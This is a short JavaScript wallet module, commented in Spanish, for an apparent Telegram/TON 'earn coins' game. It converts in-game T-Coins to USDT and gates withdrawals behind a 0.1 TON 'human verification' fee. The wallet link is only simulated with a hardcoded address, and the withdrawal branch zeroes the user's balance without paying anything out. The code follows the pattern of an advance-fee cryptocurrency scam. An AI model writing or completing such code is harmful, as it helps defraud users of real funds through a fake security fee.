/* TITAN B - PROTOCOLO DE BILLETERA (WALLET) */

const WALLET_CONFIG = {
    minimoRetiroUSDT: 5.0,
    tasaCambio: 10000, // 10,000 T-Coins = 1 USDT
    feeVerificacionTON: 0.1,
    isVerified: false
};

let userWalletAddress = null;

// Conectar con TonKeeper / Telegram Wallet
async function conectarBilletera() {
    // Aquí integraremos la TonConnect API en el index.html al final
    console.log("Iniciando Protocolo de Conexión...");
    
    // Simulación de conexión exitosa
    userWalletAddress = "EQD...4xT2"; 
    actualizarEstadoWallet();
}

function actualizarEstadoWallet() {
    const status = document.getElementById('system-status');
    if (userWalletAddress) {
        status.innerText = "BILLETERA VINCULADA";
        status.style.color = "var(--hologram-blue)";
    }
}

function solicitarRetiro() {
    const usdtEquivalente = coins / WALLET_CONFIG.tasaCambio;

    if (!userWalletAddress) {
        alert("ERROR: Vincula tu billetera TON primero.");
        return;
    }

    if (usdtEquivalente < WALLET_CONFIG.minimoRetiroUSDT) {
        alert(`Mínimo de retiro: ${WALLET_CONFIG.minimoRetiroUSDT} USDT. Te faltan ${(WALLET_CONFIG.minimoRetiroUSDT - usdtEquivalente).toFixed(2)} USDT.`);
        return;
    }

    if (!WALLET_CONFIG.isVerified) {
        alert(`PROTOCOLO DE SEGURIDAD: Para habilitar retiros, se requiere una verificación única de ${WALLET_CONFIG.feeVerificacionTON} TON para confirmar que eres humano.`);
        // Aquí se dispararía el payload de la transacción de 0.1 TON
    } else {
        alert("SOLICITUD ENVIADA: Procesando tus USDT...");
        coins = 0; // Se vacía el balance tras el retiro
        updateUI();
    }
}
